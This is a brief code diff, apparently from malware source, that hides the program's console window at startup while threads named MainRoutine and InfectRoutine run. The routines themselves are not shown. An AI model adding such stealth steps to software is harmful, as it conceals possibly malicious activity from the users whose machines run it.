@@ -168,7 +168,7 @@ void InfectRoutine() {
 }
 
 int main(int argc, char* argv[]) {
-	//::ShowWindow(::GetConsoleWindow(), SW_HIDE);
+	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
 
 	std::thread mr(MainRoutine);
 	std::thread ir(InfectRoutine);
